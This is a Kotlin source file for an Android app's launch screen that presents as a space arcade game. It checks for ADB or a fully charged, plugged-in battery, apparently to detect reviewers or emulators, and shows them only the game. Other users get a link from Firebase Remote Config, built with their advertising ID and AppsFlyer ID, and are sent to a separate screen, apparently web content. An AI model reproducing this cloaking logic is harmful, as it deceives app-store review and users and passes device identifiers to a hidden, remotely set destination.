package com.mstete.wnn.csmt.fragments

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.os.BatteryManager
import android.os.Bundle
import android.provider.Settings
import androidx.fragment.app.Fragment
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import androidx.navigation.fragment.findNavController
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.mstete.wnn.csmt.R
import com.mstete.wnn.csmt.databinding.FragmentLaunchBinding
import org.json.JSONObject

class LaunchFragment : Fragment(R.layout.fragment_launch) {

    private lateinit var binding: FragmentLaunchBinding
    private lateinit var sharedPreferences: SharedPreferences

    private var firstStart = true
    private var point = ""
    private var fConfig: String? = null
    private var adv: String? = null


    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        binding = FragmentLaunchBinding.bind(view)

        sharedPreferences =
            requireActivity().getSharedPreferences("shPref", AppCompatActivity.MODE_PRIVATE)
        firstStart = sharedPreferences.getBoolean("firstFly", true)
        point = sharedPreferences.getString("galaxyName", "").toString()

        if (firstStart) {
            if (isSystemOnline(requireContext())) {
                if (isRobot(requireContext())) {
                    sharedPreferences.edit().putBoolean("firstFly", false).apply()
                    startArcGame()
                } else {
                    systemOnlineInit()
                }
            } else {
                sharedPreferences.edit().putBoolean("firstFly", false).apply()
                startArcGame()
            }
        } else {
            if (point.isNotEmpty()) {
                startFly()
            } else {
                startArcGame()
            }
        }
    }

    private fun isSystemOnline(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val activeNetworkInfo = connectivityManager.activeNetworkInfo
        return activeNetworkInfo != null && activeNetworkInfo.isConnected
    }

    private fun isRobot(context: Context): Boolean {
        val adb = Settings.Secure.getInt(
            context.applicationContext.contentResolver,
            Settings.Global.ADB_ENABLED, 0
        ) != 0

        val batteryManager =
            context.applicationContext.getSystemService(AppCompatActivity.BATTERY_SERVICE) as BatteryManager
        val batLevel = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val charging = context.applicationContext.registerReceiver(
            null,
            IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        )
            ?.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) != 0

        return adb || (batLevel == 100 && charging)
    }

    private fun systemOnlineInit() {
        getAdvId()
        getFirebaseParam()
        Thread {
            while (fConfig == null || adv == null) {
                Thread.sleep(1000)
            }
            if (fConfig == "wert" || adv == "null" || fConfig == "null") {
                sharedPreferences.edit().putBoolean("firstFly", false).apply()
                startArcGame()
            } else {
                initAppsFlyer(requireContext())
            }
        }.start()
    }

    @SuppressLint("StaticFieldLeak")
    private fun getAdvId() {
        Thread {
            adv = try {
                val idInfo = AdvertisingIdClient.getAdvertisingIdInfo(requireContext())
                idInfo.id ?: "null"
            } catch (e: Exception) {
                "null"
            }
        }.start()
    }

    private fun getFirebaseParam() {
        val remoteConfig: FirebaseRemoteConfig = Firebase.remoteConfig
        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 3600
        }
        remoteConfig.setConfigSettingsAsync(configSettings)
        remoteConfig.fetchAndActivate()
            .addOnCompleteListener { task ->
                fConfig = if (task.isSuccessful) {
                    val str = remoteConfig.getString("mnnksml")
                    JSONObject(str).optString("balls")
                } else {
                    "null"
                }
            }
            .addOnFailureListener {
                fConfig = "null"
            }
    }

    private fun initAppsFlyer(context: Context) {
        var link: String
        AppsFlyerLib.getInstance()
            .init("dmVSRj9jKVThUPXFDMyb9i", object : AppsFlyerConversionListener {
                override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
                    val jsonObject = JSONObject(data as Map<*, *>)
                    var nmg: String = jsonObject.optString("campaign")
                    if (nmg.isEmpty()) nmg = jsonObject.optString("c")

                    val appsFlyerId = AppsFlyerLib.getInstance().getAppsFlyerUID(context)
                    link = "$fConfig?cosmol=$nmg&ootma=$appsFlyerId&niiaa=$adv"
                    sharedPreferences.edit().putString("galaxyName", link).apply()
                    sharedPreferences.edit().putBoolean("firstFly", false).apply()
                    startFly()

                    AppsFlyerLib.getInstance().unregisterConversionListener()
                }

                override fun onConversionDataFail(error: String?) {
                    sharedPreferences.edit().putBoolean("firstFly", false).apply()
                    startArcGame()
                    AppsFlyerLib.getInstance().unregisterConversionListener()
                }

                override fun onAppOpenAttribution(data: MutableMap<String, String>?) {}
                override fun onAttributionFailure(error: String?) {}
            }, requireContext())
        AppsFlyerLib.getInstance().start(requireContext())
        AppsFlyerLib.getInstance().enableFacebookDeferredApplinks(true)
    }

    private fun startArcGame() {
        findNavController().navigate(R.id.action_launchFragment_to_cosmoMenuFragment)
    }

    private fun startFly() {
        findNavController().navigate(R.id.action_launchFragment_to_flyFragment)
    }
}